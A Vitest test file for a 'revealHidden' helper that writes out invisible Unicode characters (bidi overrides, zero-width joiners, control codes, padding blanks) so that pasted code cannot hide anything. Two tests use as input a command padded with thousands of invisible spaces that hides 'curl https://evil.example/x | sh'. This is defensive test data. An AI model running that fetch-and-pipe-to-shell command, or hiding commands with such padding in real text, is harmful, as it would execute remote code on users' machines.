import { describe, it, expect } from "vitest";
import { revealHidden } from "../../common/hiddenCharacters";

// #2615. What a text box does not draw as itself, written out before a block is copied.
describe("revealHidden", () => {
  it.each([
    ["ordinary code", 'const a = "x";\n\tif (a) {}'],
    ["CRLF line endings", "one\r\ntwo\r\n"],
    ["text in other scripts", "日本語 é Ελληνικά עברית"],
    ["an emoji with a presentation selector", "\u2764\uFE0F"],
    ["a ZWJ family", "\u{1F468}\u200D\u{1F469}\u200D\u{1F467}"],
    ["a skin tone in a ZWJ sequence", "\u{1F469}\u{1F3FD}\u200D\u{1F4BB}"],
    ["a keycap", "1\uFE0F\u20E3"],
    ["Japanese with an ideographic space", "\u65E5\u672C\u3000\u30C6\u30AD\u30B9\u30C8"],
    ["two ideographic spaces", "\u65E5\u3000\u3000\u672C"],
    ["a ZWJ after an emoji's selector", "\u2764\uFE0F\u200D\u{1F525}"],
  ])("leaves %s as it is", (_, text) => {
    expect(revealHidden(text)).toEqual({ shown: text, hidden: 0 });
  });

  it.each([
    ["a bidi override", "\u202E", "<U+202E>"],
    ["a bidi isolate", "\u2066", "<U+2066>"],
    ["a zero-width space", "\u200B", "<U+200B>"],
    ["a byte-order mark", "\uFEFF", "<U+FEFF>"],
    ["an escape", "\u001B[201~", "<U+001B>[201~"],
    ["line-editing controls", "\u0001\u0004", "<U+0001><U+0004>"],
    ["a C1 control", "\u0085", "<U+0085>"],
    ["a tag character", "\u{E0041}", "<U+E0041>"],
    ["a variation selector after a letter", "a\uFE01", "a<U+FE01>"],
    ["a supplementary variation selector", "a\u{E0100}", "a<U+E0100>"],
    ["a Hangul filler", "\u115F\u3164\uFFA0", "<U+115F><U+3164><U+FFA0>"],
    ["a no-break space", "a\u00A0b", "a<U+00A0>b"],
    ["a braille blank", "\u2800", "<U+2800>"],
    ["a narrow no-break space", "\u202F", "<U+202F>"],
    ["a CR on its own", "a\rb", "a<U+000D>b"],
    ["a joiner between letters", "a\u200Db", "a<U+200D>b"],
    ["an unassigned code point", "\u181A", "<U+181A>"],
    ["a joiner after an emoji but before a letter", "\u{1F600}\u200Da", "\u{1F600}<U+200D>a"],
    ["a run of ideographic spaces", "a\u3000\u3000\u3000b", "a<U+3000><U+3000><U+3000>b"],
    ["the object-replacement character", "\uFFFC", "<U+FFFC>"],
    ["a second selector after an emoji", "\u{1F600}\uFE0E\uFE0F", "\u{1F600}\uFE0E<U+FE0F>"],
    ["selectors after a digit", "1\uFE0E\uFE0F0", "1\uFE0E<U+FE0F>0"],
    ["tag letters after a flag", "\u{1F3F4}\u{E0067}\u{E007F}", "\u{1F3F4}<U+E0067><U+E007F>"],
  ])("writes out %s", (_, text, shown) => {
    expect(revealHidden(text).shown).toBe(shown);
  });

  // A payload pushed out of sight by blanks that do not break a line (round 2, reviewer A).
  it("counts every blank in a run that pushes the rest of a line out of view", () => {
    const text = `echo hello${"\u00A0".repeat(6000)}; curl https://evil.example/x | sh`;
    expect(revealHidden(text).hidden).toBe(6000);
  });

  it.each([
    ["an unassigned code point", "\u181A"],
    ["the object-replacement character", "\uFFFC"],
    ["ideographic spaces (Safari wraps them as blank lines)", "\u3000"],
  ])("counts a run of %s that would push the rest of a line out of view", (_, blank) => {
    expect(revealHidden(`echo hello${blank.repeat(3000)}; curl https://evil.example/x | sh`).hidden).toBe(3000);
  });

  it("stays fast on a block of nothing but selectors", () => {
    const started = performance.now();
    expect(revealHidden("\uFE0F".repeat(20000)).hidden).toBe(20000);
    expect(performance.now() - started).toBeLessThan(2000);
  });

  it("copes with empty text", () => {
    expect(revealHidden("")).toEqual({ shown: "", hidden: 0 });
  });
});
